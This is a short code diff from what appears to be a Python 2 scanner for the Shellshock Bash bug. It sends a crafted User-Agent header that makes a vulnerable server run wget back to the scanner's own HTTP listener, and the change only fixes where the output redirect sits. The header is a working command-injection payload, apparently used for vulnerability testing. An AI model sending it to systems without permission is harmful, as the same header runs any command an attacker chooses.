@@ -34,7 +34,7 @@ class CustomHandler(SimpleHTTPServer.SimpleHTTPRequestHandler):
 
 def test_ip(ip_address, target_port, identifier, ssl):
 	#Send a Bash/CGI Injection with the unique identifier.
-	user_agent_str="() { ignored;};/bin/bash -c 'wget http://%s:%s/%s'>>/dev/null" %(local_ip,str(local_port),identifier)
+	user_agent_str="() { ignored;};/bin/bash -c 'wget http://%s:%s/%s>>/dev/null'" %(local_ip,str(local_port),identifier)
 	print user_agent_str
 	opener = urllib2.build_opener()
 	opener.addheaders = [('User-agent', user_agent_str)]
